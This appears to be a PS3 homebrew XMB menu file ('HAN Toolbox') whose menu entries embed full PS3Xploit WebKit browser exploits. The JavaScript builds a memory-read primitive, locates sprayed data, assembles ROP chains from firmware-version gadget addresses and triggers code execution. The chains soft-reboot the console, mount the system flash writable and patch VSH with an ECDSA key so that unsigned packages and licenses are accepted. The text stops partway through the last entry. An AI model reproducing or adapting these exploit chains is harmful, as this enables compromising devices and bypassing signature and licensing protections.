<XMBML version="1.0">

<!-- Main Items CEX (here : icon update notification) -->
		
	<View id="han_main_items">
		<Attributes>
			<Table key="han_reboot_soft_offline">
				<Pair key="icon"><String>/dev_hdd0/game/HANTOOLBX/USRDIR/IMAGES/reboot.png</String></Pair>
				<Pair key="title"><String>Offline Soft Rebooter</String></Pair>
				<Pair key="info"><String>Restart console</String></Pair>
				<Pair key="module_name"><String>webrender_plugin</String></Pair>
				<Pair key="module_action"><String>javascript:eval('var xtra_data,stack_frame,jump_2,jump_1,xtra_data_addr,stack_frame_addr,jump_2_addr,jump_1_addr,debug=!1,ps3xploit_ecdsa_key="948DA13E8CAFD5BA0E90CE434461BB327FE7E080475EAA0AD3AD4F5B6247A7FDA86DF69790196773",index_key="DA7D4B5E499A4F53B1C1A14A7484443B",start_x="xxxx",offset_array=[],t_out=0,ps3xploit_ecdsa_key_addr=0,index_key_addr=0,search_max_threshold=73400320,search_base=2148532224,search_size=2 * mbytes,search_base_off=0,search_size_ext=0,gtemp_addr=2365587456,total_loops=0,max_loops=20,frame_fails=0,sp_exit=2413354176,ffs=4294967295,dbyte41=16705,dbyte00=0,byte_size=1,hword_size=2,word_size=4,dword_size=8,mbytes=1048576,stat_size_offset=40,hr="\074hr\076",sc_sm_shutdown=0x17B,soft_reboot=0x200,ua=navigator.userAgent,fwv=ua.substring(ua.indexOf("5.0 (") + 19,ua.indexOf(") Apple"));document.write(\047\074html\076\074head\076\074title\076PS3Xploit - Offline Soft Rebooter by lmn7\074/title\076\074/head\076\074body id="bodyId" style="background-color:#FFFFFF"\076\074div id="headerId"\076\074h1\076Soft Rebooting...\074/h1\076\074span id="hideme" style="visibility:hidden"\076\074p\076\074button id="btnROP" type="button" onclick="initROP(true);" autofocus\076Initialize\074/button\076 | Close \074input type="checkbox" id="auto_close" name="aclose" checked="checked" onclick="autoclose();"/\076\074span id="dex_txt" style="visibility:hidden"\076\074input type="checkbox" id="dex" name="DEX" disabled="" onclick="dex();"/\076\074/span\076\074/p\076\074p\076\074button id="btnTrigger" disabled="" type="button" onclick="triggerX();"\076En\074/button\076\074span id="reset" style="visibility:hidden"\076 | \074button id="btnReset" type="button" onclick="disable_trigger();"\076Reset\074/button\076\074/span\076\074/p\076\074/span\076\074div id="exploit" \076\074/div\076\074div id="trigger"\076\074/div\076\074/body\076\074/html\076\047); var toc_addr=0x6F5558, gadget1_addr=0x097604, gadget8_addr=0x020000, gadget12_addr=0x0C864C, gadget_mod1_addr=0x60EFD8, gadget_mod2_addr=0x013B74, gadget_mod3_addr=0x0B8E00, gadget_mod4a_addr=0x0D9684, gadget_mod4b_addr=0x42C778, gadget_mod7_addr=0x01A6AC, gadget_mod8_addr=0x2BACB8; if (fwv=="4.81") { toc_addr=0x6F5520; gadget_mod1_addr=0x60E59C; gadget_mod4b_addr=0x42C774, gadget_mod8_addr=0x2BACB4; } else if (fwv=="4.82") { toc_addr=0x6F5550; gadget_mod1_addr=0x60EF38; } function hexh2bin(a){return String.fromCharCode(a)}function hexw2bin(a){return String.fromCharCode(a\076\07616)+String.fromCharCode(a)}function hexdw2bin(a){return hexw2bin(0)+hexw2bin(a)}String.prototype.toHex16=function(){return(\0470000\047+this).substr(-4)};String.prototype.toAscii=function(a){var b=\047\047;var i=0;while(i\074this.length){if(a===true){b+=this.charCodeAt(i).toString(16).toHex16()}else{b+=this.charCodeAt(i).toString(16)}i+=1}return b};String.prototype.convert=function(a){if(this.length\0741){return\047\047}var b=\047\047;var c=\047\047;var i=0;var d=[];if(a===true){b=this}else{b=this.toAscii()}while((b.length%4)!==0){b+=\04700\047}if(b.substr(b.length-3,2)!==\04700\047){b+=\0470000\047}while(i\074b.length){c=b.substr(i,4);d.push(String.fromCharCode(parseInt(c,16)));i+=4}return d.join(\047\047)};String.prototype.convertedSize=function(a){if(this.length\0741){return 0}var b=\047\047;if(a===true){b=this}else{b=this.toAscii()}while((b.length%4)!==0){b+=\04700\047}if(b.substr(b.length-3,2)!==\04700\047){b+=\0470000\047}return b.length/2};String.prototype.replaceAt=function(a,b){return this.substr(0,a)+b+this.substr(a+b.length)};String.prototype.repeat=function(a){return new Array(a+1).join(this)};Number.prototype.noExponents=function(){var a=String(this).split(/[eE]/);if(a.length===1){return a[0]}var z=\047\047,sign=this\0740?\047-\047:\047\047,str=a[0].replace(\047.\047,\047\047),mag=Number(a[1])+1;if(mag\0740){z=sign+\0470.\047;while(mag++){z+=\0470\047}return z+str.replace(/^\-/,\047\047)}mag-=str.length;while(mag--){z+=\0470\047}return str+z};function fromIEEE754(a,b,c){var d=0;var g=[];var i;var j;var h;for(i=a.length;i;i-=1){h=a[i-1];for(j=8;j;j-=1){g.push(h%2?1:0);h=h\076\0761}}g.reverse();var k=g.join(\047\047);var l=(1\074\074(b-1))-1;var s=parseInt(k.substring(0,1),2)?-1:1;var e=parseInt(k.substring(1,1+b),2);var f=parseInt(k.substring(1+b),2);if(e===(1\074\074b)-1){d=f!==0?NaN:s*Infinity}else if(e\0760){d=s*Math.pow(2,e-l)*(1+f/Math.pow(2,c))}else if(f!==0){d=s*Math.pow(2,-(l-1))*(f/Math.pow(2,c))}else{d=s*0}return d.noExponents()}function generateIEEE754(a,b){var c=new Array((a\076\07624)&0xFF,(a\076\07616)&0xFF,(a\076\0768)&0xFF,(a)&0xFF,(b\076\07624)&0xFF,(b\076\07616)&0xFF,(b\076\0768)&0xFF,(b)&0xFF);return fromIEEE754(c,11,52)}function generateExploit(a,b){var n=(a\074\07432)|((b\076\0761)-1);return generateIEEE754(a,(n-a))}function readMemory(a,b){if(document.getElementById(\047exploit\047)){document.getElementById(\047exploit\047).style.src="local("+generateExploit(a,b)+")"}}function checkMemory(a,b,c){if(document.getElementById(\047exploit\047)){readMemory(a,b);if(debug===true){var x=document.getElementById(\047exploit\047).style.src.substr(6,c);return x}return document.getElementById(\047exploit\047).style.src.substr(6,c)}}function trigger(a){if(document.getElementById(\047trigger\047)){document.getElementById("trigger").innerHTML=-parseFloat("NAN(ffffe"+a.toString(16)+")")}}function rop_exit(a){var b=document.getElementById(\047auto_close\047);if(b){if(b.checked===true)window.close()}}function load_check(){if(total_loops\074max_loops){t_out=setTimeout(initROP,1000,false)}else{total_loops=0;t_out=0}}function findJsVariableOffset(a,b,c,d){readMemory(c,d);var e=document.getElementById(\047exploit\047).style.src.substr(6,d);var i=0;var t;var k;var f;var g;while(i\074(e.length*2)){if(e.charCodeAt(i/2)===b.charCodeAt(0)){f=0;for(k=0;k\074(b.length*2);k+=0x2){if(e.charCodeAt((i+k)/2)!==b.charCodeAt(k/2)){break}f+=1}if(f===b.length){g=c+i+4;for(t=0;t\074offset_array.length;t+=1){if(offset_array[t]===g){return-1}}offset_array.push(g);return g}}i+=0x10}var h=c+d;return 0}function memcpy(a,b,c){return callsub(gadget8_addr,a,b,c,0,0,0,0,0,0,0x70)}function store_word(a,b,c,d,e){if(c===null){c=gtemp_addr}if(d===null){d=gtemp_addr}if(e===null){e=gtemp_addr}return hexdw2bin(gadget_mod3_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(b)+fill_by_8bytes(0x8,dbyte41)+hexdw2bin(a-0xC74)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod7_addr)+fill_by_16bytes(0x70,dbyte41)+hexdw2bin(c)+hexdw2bin(d)+hexdw2bin(e)+hexdw2bin(sp_exit)+fill_by_8bytes(0x8,dbyte41)}function stack_frame_hookup(){return unescape("\\u4141\\u2A2F")+hexw2bin(gadget1_addr)+hexw2bin(toc_addr)+fill_by_16bytes(0x20,dbyte41)+hexdw2bin(toc_addr)+fill_by_16bytes(0x70,dbyte41)}function stack_frame_exit(){return hexdw2bin(gadget_mod8_addr)+unescape("\\u2F2A")}function syscall(a,b,c,d,e,f,g,h,i,j){if(j===null){j=gtemp_addr}return hexdw2bin(gadget_mod2_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(gtemp_addr)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod1_addr)+fill_by_16bytes(0x50,dbyte41)+fill_by_4bytes(0xC,dbyte41)+hexw2bin(a)+hexw2bin(i)+hexw2bin(g)+hexw2bin(f)+hexw2bin(e)+hexw2bin(d)+hexw2bin(c)+fill_by_4bytes(0x4,dbyte41)+hexw2bin(h)+fill_by_16bytes(0x20,dbyte41)+hexdw2bin(b)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod2_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(gtemp_addr)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod4a_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(j)+hexdw2bin(sp_exit)+fill_by_8bytes(0x8,dbyte41)}function callsub(a,b,c,d,e,f,g,h,i,j,k,l,m){var n=0x20;if(m===null){m=gtemp_addr}if(l===null){l=gtemp_addr}return hexdw2bin(gadget_mod2_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(gtemp_addr)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod1_addr)+fill_by_16bytes(0x50,dbyte41)+fill_by_4bytes(0xC,dbyte41)+hexw2bin(j)+hexw2bin(i)+hexw2bin(g)+hexw2bin(f)+hexw2bin(e)+hexw2bin(d)+hexw2bin(c)+fill_by_4bytes(0x4,dbyte41)+hexw2bin(h)+fill_by_16bytes(0x20,dbyte41)+hexdw2bin(b)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod2_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(l)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(a)+fill_by_16bytes(k-n,dbyte00)+hexdw2bin(m)+hexdw2bin(sp_exit)+fill_by_8bytes(0x8,dbyte41)}function fill_by_4bytes(a,b){var c=\047\047;var d=0;var e=hexh2bin(b);while(d\074a/4){c+=e.repeat(2);d++}return c}function fill_by_8bytes(a,b){var c=\047\047;var d=0;var e=hexh2bin(b);while(d\074a/8){c+=e.repeat(4);d++}return c}function fill_by_16bytes(a,b){var c=\047\047;var d=0;var e=hexh2bin(b);while(d\074a/16){c+=e.repeat(8);d++}return c}function initDefaults(){offset_array=[];xtra_data_addr=0;stack_frame_addr=0;jump_2_addr=0;jump_1_addr=0;ps3xploit_ecdsa_key_addr=0;index_key_addr=0;search_max_threshold=70*0x100000;search_base=0x80100000;search_size=2*mbytes;search_size_ext=0*mbytes;search_base_off=0*mbytes;total_loops++}function initROP(a){try{if(a===true){frame_fails=0;search_base_off=0;search_size_ext=0}if(t_out!==0){clearTimeout(t_out);t_out=0}initDefaults();xtra_data=start_x.convert()+unescape("\\uFD7E");while(xtra_data_addr===0){if(search_max_threshold\074search_size){load_check();return}xtra_data=xtra_data.replaceAt(0,hexh2bin(0x7EFD));xtra_data_addr=findJsVariableOffset("xtra_data",xtra_data,search_base,search_size);search_max_threshold-=search_size}stack_frame=stack_frame_hookup()+callsub(gadget12_addr,2,0,0,0,0,0,0,0,0,0x80)+syscall(sc_sm_shutdown,soft_reboot,0,0,0,0,0,0,0)+stack_frame_exit();while(stack_frame_addr===0){if(search_max_threshold\074search_size+search_size_ext){frame_fails++;if((frame_fails%10)===0){search_base_off+=0;search_size_ext+=0}load_check();return}stack_frame=stack_frame.replaceAt(0,hexh2bin(0x2A2F));stack_frame_addr=findJsVariableOffset("stack_frame",stack_frame,search_base+search_base_off,search_size+search_size_ext);if(stack_frame_addr==-1)if(search_max_threshold\074search_size+search_size_ext){frame_fails++;load_check();return}search_max_threshold-=search_size+search_size_ext}jump_2=unescape("\\u0102\\u7EFB")+fill_by_16bytes(0x30,0x8282)+hexw2bin(stack_frame_addr)+unescape("\\uFB7E");while(jump_2_addr===0){if(search_max_threshold\074search_size){load_check();return}jump_2=jump_2.replaceAt(0,hexh2bin(0x7EFB));jump_2_addr=findJsVariableOffset("jump_2",jump_2,search_base,search_size);if(jump_2_addr==-1)if(search_max_threshold\074search_size){load_check();return}search_max_threshold-=search_size}jump_1=unescape("\\u4141\\u7EFA")+hexw2bin(jump_2_addr)+unescape("\\uFA7E");while(jump_1_addr===0){if(search_max_threshold\074search_size){load_check();return}jump_1=jump_1.replaceAt(0,hexh2bin(0x7EFA));jump_1_addr=findJsVariableOffset("jump_1",jump_1,search_base,search_size);if(jump_1_addr==-1)if(search_max_threshold\074search_size){load_check();return}search_max_threshold-=search_size}var b=checkMemory(stack_frame_addr-0x4,0x8000,stack_frame.length);var x=checkMemory(xtra_data_addr-0x4,0x1000,xtra_data.length);var c=checkMemory(jump_2_addr-0x4,0x1000,jump_2.length);var d=checkMemory(jump_1_addr-0x4,0x1000,jump_1.length);if((c===jump_2)&&(d===jump_1)&&(x===xtra_data)&&(b===stack_frame)){if(t_out!==0){clearTimeout(t_out)}triggerX()}else{load_check()}}catch(e){debug=true;debug=false}}function triggerX(){setTimeout(trigger,1000,jump_1_addr);setTimeout(rop_exit,2000,hr);setTimeout(window.close,2000);t_out=0;total_loops=0}initROP(true);');</String></Pair>
			</Table>
			<Table key="han_debug_han_offline">
				<Pair key="icon"><String>/dev_hdd0/game/HANTOOLBX/USRDIR/IMAGES/dadi590_debug_han_enabler.png</String></Pair>
				<Pair key="title"><String>Offline Debug Packages and (partial) HAN Enabler</String></Pair>
				<Pair key="info"><String>Enable installation of modified retail packages and running of HAN licensed games</String></Pair>
				<Pair key="module_name"><String>webrender_plugin</String></Pair>
				<Pair key="module_action"><String>javascript:eval('var ecdsa_key="948DA13E8CAFD5BA0E90CE434461BB327FE7E080475EAA0AD3AD4F5B6247A7FDA86DF69790196773",index_key="DA7D4B5E499A4F53B1C1A14A7484443B",start_x=\047xxxx\047,flash_par="CELL_FS_IOS:BUILTIN_FLSH1",fs_fat="CELL_FS_FAT",mount_path="/dev_blind",xtra_data,stack_frame,jump_2,jump_1,xtra_data_addr,stack_frame_addr,jump_2_addr,jump_1_addr,offset_array=[],t_out=0,ecdsa_key_addr=0,index_key_addr=0,search_max_threshold=73400320,search_base=2148532224,search_size=2*mbytes,search_base_off=0,search_size_ext=0,gtemp_addr=2365587456,total_loops=0,max_loops=20,frame_fails=0,sp_exit=2413354176,ffs=4294967295,dbyte41=16705,dbyte00=0,byte_size=1,hword_size=2,word_size=4,dword_size=8,mbytes=1048576,stat_size_offset=40,hr="\074hr\076",ua=navigator.userAgent,fwv=ua.substring(ua.indexOf("5.0 (")+19,ua.indexOf(") Apple")),ipf1_addr=7256944,ipf2_addr=5272436;document.write(\047\074html\076\074title\076PS3Xploit - Offline Debug PKGs/HAN Enabler by lmn7\074/title\076\074h1\076Enabling Debug PKGs and (partially) HAN...\074/h1\076\074div id="exploit"\076\074/div\076\074div id="trigger"\076\074/div\076\074/html\076\047); var toc_addr=0x6F5558, vsh_opd_addr=0x6EBB70, vsh_opd_patch=0x096D5C, vsh_ps3xploit_key_toc=0x70786C, default_vsh_pub_toc=0x6ED5AC, gadget1_addr=0x097604, gadget8_addr=0x020000, gadget_mod1_addr=0x60EFD8, gadget_mod2_addr=0x013B74, gadget_mod3_addr=0x0B8E00, gadget_mod4a_addr=0x0D9684, gadget_mod7_addr=0x01A6AC, gadget_mod8_addr=0x2BACB8; if (fwv=="4.81") { toc_addr=0x6F5520; vsh_opd_addr=0x6EBB38; vsh_ps3xploit_key_toc=0x70733C; default_vsh_pub_toc=0x6ED574; gadget_mod1_addr=0x60E59C; gadget_mod8_addr=0x2BACB4; } else if (fwv=="4.82") { toc_addr=0x6F5550; vsh_opd_addr=0x6EBB68; vsh_ps3xploit_key_toc=0x707774; default_vsh_pub_toc=0x6ED5A4; gadget_mod1_addr=0x60EF38; } else if (fwv>="4.86") { vsh_ps3xploit_key_toc=0x707A1C; } function hexh2bin(a){return String.fromCharCode(a)}function hexw2bin(a){return String.fromCharCode(a\076\07616)+String.fromCharCode(a)}function hexdw2bin(a){return hexw2bin(0)+hexw2bin(a)}String.prototype.convertedSize=function(a){if(this.length\0741){return 0}var b=\047\047;if(a===true){b=this}else{b=this.toAscii()}while((b.length%4)!==0){b+=\04700\047}if(b.substr(b.length-3,2)!==\04700\047){b+=\0470000\047}return b.length/2};String.prototype.toHex16=function(){return(\0470000\047+this).substr(-4)};String.prototype.toAscii=function(a){var b=\047\047;var i=0;while(i\074this.length){if(a===true){b+=this.charCodeAt(i).toString(16).toHex16()}else{b+=this.charCodeAt(i).toString(16)}i+=1}return b};String.prototype.convert=function(a){if(this.length\0741){return\047\047}var b=\047\047;var c=\047\047;var i=0;var d=[];if(a===true){b=this}else{b=this.toAscii()}while((b.length%4)!==0){b+=\04700\047}if(b.substr(b.length-3,2)!==\04700\047){b+=\0470000\047}while(i\074b.length){c=b.substr(i,4);d.push(String.fromCharCode(parseInt(c,16)));i+=4}return d.join(\047\047)};String.prototype.replaceAt=function(a,b){return this.substr(0,a)+b+this.substr(a+b.length)};String.prototype.repeat=function(a){return new Array(a+1).join(this)};Number.prototype.noExponents=function(){var a=String(this).split(/[eE]/);if(a.length===1){return a[0]}var z=\047\047,sign=this\0740?\047-\047:\047\047,str=a[0].replace(\047.\047,\047\047),mag=Number(a[1])+1;if(mag\0740){z=sign+\0470.\047;while(mag++){z+=\0470\047}return z+str.replace(/^\-/,\047\047)}mag-=str.length;while(mag--){z+=\0470\047}return str+z};function fromIEEE754(a,b,c){var d=0;var g=[];var i;var j;var h;for(i=a.length;i;i-=1){h=a[i-1];for(j=8;j;j-=1){g.push(h%2?1:0);h=h\076\0761}}g.reverse();var k=g.join(\047\047);var l=(1\074\074(b-1))-1;var s=parseInt(k.substring(0,1),2)?-1:1;var e=parseInt(k.substring(1,1+b),2);var f=parseInt(k.substring(1+b),2);if(e===(1\074\074b)-1){d=f!==0?NaN:s*Infinity}else if(e\0760){d=s*Math.pow(2,e-l)*(1+f/Math.pow(2,c))}else if(f!==0){d=s*Math.pow(2,-(l-1))*(f/Math.pow(2,c))}else{d=s*0}return d.noExponents()}function generateIEEE754(a,b){var c=new Array((a\076\07624)&0xFF,(a\076\07616)&0xFF,(a\076\0768)&0xFF,(a)&0xFF,(b\076\07624)&0xFF,(b\076\07616)&0xFF,(b\076\0768)&0xFF,(b)&0xFF);return fromIEEE754(c,11,52)}function generateExploit(a,b){var n=(a\074\07432)|((b\076\0761)-1);return generateIEEE754(a,(n-a))}function readMemory(a,b){if(document.getElementById(\047exploit\047)){document.getElementById(\047exploit\047).style.src="local("+generateExploit(a,b)+")"}}function checkMemory(a,b,c){if(document.getElementById(\047exploit\047)){readMemory(a,b);return document.getElementById(\047exploit\047).style.src.substr(6,c)}}function trigger(a){if(document.getElementById(\047trigger\047)){document.getElementById("trigger").innerHTML=-parseFloat("NAN(ffffe"+a.toString(16)+")")}}function load_check(){if(total_loops\074max_loops){t_out=setTimeout(initROP,1000,false)}else{total_loops=0;t_out=0}}function findJsVariableOffset(a,b,c,d){readMemory(c,d);var e=document.getElementById(\047exploit\047).style.src.substr(6,d);var i=0;var t;var k;var f;var g;while(i\074(e.length*2)){if(e.charCodeAt(i/2)===b.charCodeAt(0)){f=0;for(k=0;k\074(b.length*2);k+=0x2){if(e.charCodeAt((i+k)/2)!==b.charCodeAt(k/2)){break}f+=1}if(f===b.length){g=c+i+4;for(t=0;t\074offset_array.length;t+=1){if(offset_array[t]===g){return-1}}offset_array.push(g);return g}}i+=0x10}var h=c+d;return 0}function memcpy(a,b,c){return callsub(gadget8_addr,a,b,c,0,0,0,0,0,0,0x70)}function store_word(a,b,c,d,e){c=gtemp_addr;d=gtemp_addr;e=gtemp_addr;return hexdw2bin(gadget_mod3_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(b)+fill_by_8bytes(0x8,dbyte41)+hexdw2bin(a-0xC74)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod7_addr)+fill_by_16bytes(0x70,dbyte41)+hexdw2bin(c)+hexdw2bin(d)+hexdw2bin(e)+hexdw2bin(sp_exit)+fill_by_8bytes(0x8,dbyte41)}function stack_frame_hookup(){return unescape("\\u4141\\u2A2F")+hexw2bin(gadget1_addr)+hexw2bin(toc_addr)+fill_by_16bytes(0x20,dbyte41)+hexdw2bin(toc_addr)+fill_by_16bytes(0x70,dbyte41)}function stack_frame_exit(){return hexdw2bin(gadget_mod8_addr)+unescape("\\u2F2A")}function syscall(a,b,c,d,e,f,g,h,i,j){if(j===null){j=gtemp_addr}return hexdw2bin(gadget_mod2_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(gtemp_addr)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod1_addr)+fill_by_16bytes(0x50,dbyte41)+fill_by_4bytes(0xC,dbyte41)+hexw2bin(a)+hexw2bin(i)+hexw2bin(g)+hexw2bin(f)+hexw2bin(e)+hexw2bin(d)+hexw2bin(c)+fill_by_4bytes(0x4,dbyte41)+hexw2bin(h)+fill_by_16bytes(0x20,dbyte41)+hexdw2bin(b)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod2_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(gtemp_addr)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod4a_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(j)+hexdw2bin(sp_exit)+fill_by_8bytes(0x8,dbyte41)}function callsub(a,b,c,d,e,f,g,h,i,j,k,l,m){var n=0x20;if(m===null){m=gtemp_addr}if(l===null){l=gtemp_addr}return hexdw2bin(gadget_mod2_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(gtemp_addr)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod1_addr)+fill_by_16bytes(0x50,dbyte41)+fill_by_4bytes(0xC,dbyte41)+hexw2bin(j)+hexw2bin(i)+hexw2bin(g)+hexw2bin(f)+hexw2bin(e)+hexw2bin(d)+hexw2bin(c)+fill_by_4bytes(0x4,dbyte41)+hexw2bin(h)+fill_by_16bytes(0x20,dbyte41)+hexdw2bin(b)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod2_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(l)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(a)+fill_by_16bytes(k-n,dbyte00)+hexdw2bin(m)+hexdw2bin(sp_exit)+fill_by_8bytes(0x8,dbyte41)}function fill_by_4bytes(a,b){var c=\047\047;var d=0;var e=hexh2bin(b);while(d\074a/4){c+=e.repeat(2);d++}return c}function fill_by_8bytes(a,b){var c=\047\047;var d=0;var e=hexh2bin(b);while(d\074a/8){c+=e.repeat(4);d++}return c}function fill_by_16bytes(a,b){var c=\047\047;var d=0;var e=hexh2bin(b);while(d\074a/16){c+=e.repeat(8);d++}return c}function initROP(a){try{if(a===true){frame_fails=0;search_base_off=0;search_size_ext=0}if(t_out!==0){clearTimeout(t_out);t_out=0}offset_array=[];xtra_data_addr=0;stack_frame_addr=0;jump_2_addr=0;jump_1_addr=0;ecdsa_key_addr=0;index_key_addr=0;search_max_threshold=70*0x100000;search_base=0x80200000;search_size=2*mbytes;search_size_ext=0*mbytes;search_base_off=0*mbytes;total_loops++;xtra_data=start_x.convert()+ecdsa_key.convert(true)+index_key.convert(true)+flash_par.convert()+fs_fat.convert()+mount_path.convert()+unescape("\\uFD7E");while(xtra_data_addr===0){if(search_max_threshold\074search_size){load_check();return}xtra_data=xtra_data.replaceAt(0,hexh2bin(0x7EFD));xtra_data_addr=findJsVariableOffset("xtra_data",xtra_data,search_base,search_size);search_max_threshold-=search_size}ecdsa_key_addr=xtra_data_addr+start_x.convertedSize()-0x4;index_key_addr=ecdsa_key_addr+ecdsa_key.convertedSize(true);flash_par_addr=index_key_addr+index_key.convertedSize(true);fs_fat_addr=flash_par_addr+flash_par.convertedSize();mount_path_addr=fs_fat_addr+14;stack_frame=stack_frame_hookup()+syscall(0x345,flash_par_addr,fs_fat_addr,mount_path_addr,0,0,0,0,0)+store_word(vsh_opd_addr,vsh_opd_patch)+store_word(default_vsh_pub_toc,vsh_ps3xploit_key_toc)+memcpy(vsh_ps3xploit_key_toc-0x20,index_key_addr,(index_key.length/2))+memcpy(vsh_ps3xploit_key_toc,ecdsa_key_addr,(ecdsa_key.length/2))+stack_frame_exit();while(stack_frame_addr===0){if(search_max_threshold\074search_size+search_size_ext){frame_fails++;if((frame_fails%10)===0){search_base_off+=0;search_size_ext+=0}load_check();return}stack_frame=stack_frame.replaceAt(0,hexh2bin(0x2A2F));stack_frame_addr=findJsVariableOffset("stack_frame",stack_frame,search_base+search_base_off,search_size+search_size_ext);if(stack_frame_addr==-1)if(search_max_threshold\074search_size+search_size_ext){frame_fails++;load_check();return}search_max_threshold-=search_size+search_size_ext}jump_2=unescape("\\u0102\\u7EFB")+fill_by_16bytes(0x30,0x8282)+hexw2bin(stack_frame_addr)+unescape("\\uFB7E");while(jump_2_addr===0){if(search_max_threshold\074search_size){load_check();return}jump_2=jump_2.replaceAt(0,hexh2bin(0x7EFB));jump_2_addr=findJsVariableOffset("jump_2",jump_2,search_base,search_size);if(jump_2_addr==-1)if(search_max_threshold\074search_size){load_check();return}search_max_threshold-=search_size}jump_1=unescape("\\u4141\\u7EFA")+hexw2bin(jump_2_addr)+unescape("\\uFA7E");while(jump_1_addr===0){if(search_max_threshold\074search_size){load_check();return}jump_1=jump_1.replaceAt(0,hexh2bin(0x7EFA));jump_1_addr=findJsVariableOffset("jump_1",jump_1,search_base,search_size);if(jump_1_addr==-1)if(search_max_threshold\074search_size){load_check();return}search_max_threshold-=search_size}var b=checkMemory(stack_frame_addr-0x4,0x8000,stack_frame.length);var x=checkMemory(xtra_data_addr-0x4,0x1000,xtra_data.length);var c=checkMemory(jump_2_addr-0x4,0x1000,jump_2.length);var d=checkMemory(jump_1_addr-0x4,0x1000,jump_1.length);if((c===jump_2)&&(d===jump_1)&&(x===xtra_data)&&(b===stack_frame)){if(t_out!==0){clearTimeout(t_out)}triggerX()}else{load_check()}}catch(e){}}function triggerX(){setTimeout(trigger,50,jump_1_addr);setTimeout(window.close,250)}initROP(true);');</String></Pair>
			</Table>
			<Table key="han_enabler_offline">
				<Pair key="icon"><String>/dev_hdd0/game/HANTOOLBX/USRDIR/IMAGES/han_enable.png</String></Pair>
				<Pair key="title"><String>Offline HAN Enabler</String></Pair>
				<Pair key="info"><String>Enable custom signed packages and licenses</String></Pair>
				<Pair key="module_name"><String>webrender_plugin</String></Pair>
				<Pair key="module_action"><String>javascript:eval('var xtra_data,stack_frame,jump_2,jump_1,xtra_data_addr,stack_frame_addr,jump_2_addr,jump_1_addr,debug=!1,ps3xploit_ecdsa_key="948DA13E8CAFD5BA0E90CE434461BB327FE7E080475EAA0AD3AD4F5B6247A7FDA86DF69790196773",index_key="DA7D4B5E499A4F53B1C1A14A7484443B",start_x="xxxx",offset_array=[],t_out=0,ps3xploit_ecdsa_key_addr=0,index_key_addr=0,search_max_threshold=73400320,search_base=2148532224,search_size=2*mbytes,search_base_off=0,search_size_ext=0,gtemp_addr=2365587456,total_loops=0,max_loops=20,frame_fails=0,sp_exit=2413354176,ffs=4294967295,dbyte41=16705,dbyte00=0,byte_size=1,hword_size=2,word_size=4,dword_size=8,mbytes=1048576,stat_size_offset=40,toc_addr=7296336,default_vsh_pub_toc=7263652,vsh_opd_patch=617820,vsh_opd_addr=7256936,vsh_ps3xploit_key_toc=7370612,toc_entry1_addr=7185360,toc_entry2_addr=7494200,toc_entry3_addr=7185352,toc_entry4_addr=7602176,toc_entry5_addr=7255744,toc_entry6_addr=0,gadget1_addr=620036,gadget2_addr=6332484,gadget3_addr=872540,gadget4_addr=2267192,gadget5_addr=1227548,gadget6_addr=6380604,gadget7_addr=131024,gadget8_addr=131072,gadget_mod1_addr=6352696,gadget_mod2_addr=80756,gadget_mod3_addr=757248,gadget_mod4a_addr=890500,gadget_mod7_addr=108204,gadget_mod8_addr=2862264,hr="\074hr\076",ua=navigator.userAgent,fwv=ua.substring(ua.indexOf("5.0 (")+19,ua.indexOf(") Apple")),ipf1_addr=0x6ebb70,ipf2_addr=0x507374;document.write(\047\074html\076\074head\076\074title\076PS3Xploit - Offline HAN Enabler by lmn7\074/title\076\074/head\076\074body id="bodyId" style="background-color:#FFFFFF"\076\074div id="headerId"\076\074h1\076Enabling HAN...\074/h1\076\074span id="hideme" style="visibility:hidden"\076\074p\076\074button id="btnROP" type="button" onclick="initROP(true);" autofocus\076Initialize\074/button\076 | Close \074input type="checkbox" id="auto_close" name="aclose" checked="checked" onclick="autoclose();"/\076\074span id="dex_txt" style="visibility:hidden"\076\074input type="checkbox" id="dex" name="DEX" disabled="" onclick="dex();"/\076\074/span\076\074/p\076\074p\076\074button id="btnTrigger" disabled="" type="button" onclick="triggerX();"\076En\074/button\076\074span id="reset" style="visibility:hidden"\076 | \074button id="btnReset" type="button" onclick="disable_trigger();"\076Reset\074/button\076\074/span\076\074/p\076\074/span\076\074div id="exploit" \076\074/div\076\074div id="trigger"\076\074/div\076\074/body\076\074/html\076\047); var toc_addr=0x6F5558, vsh_ps3xploit_key_toc=0x70786C, default_vsh_pub_toc=0x6ED5AC, vsh_opd_patch=0x096D5C, toc_entry1_addr=0x6DA3D0, toc_entry3_addr=0x6DA3C8, toc_entry5_addr=0x6EB6C8, gadget1_addr=0x097604, gadget8_addr=0x020000, gadget_mod1_addr=0x60EFD8, gadget_mod2_addr=0x013B74, gadget_mod3_addr=0x0B8E00, gadget_mod4a_addr=0x0D9684, gadget_mod7_addr=0x01A6AC, gadget_mod8_addr=0x2BACB8, ipf1_addr=0x6ebb70, ipf2_addr=0x507374; if (fwv=="4.81") { toc_addr=0x6F5520; vsh_ps3xploit_key_toc=0x70733C; default_vsh_pub_toc=0x6ED574; 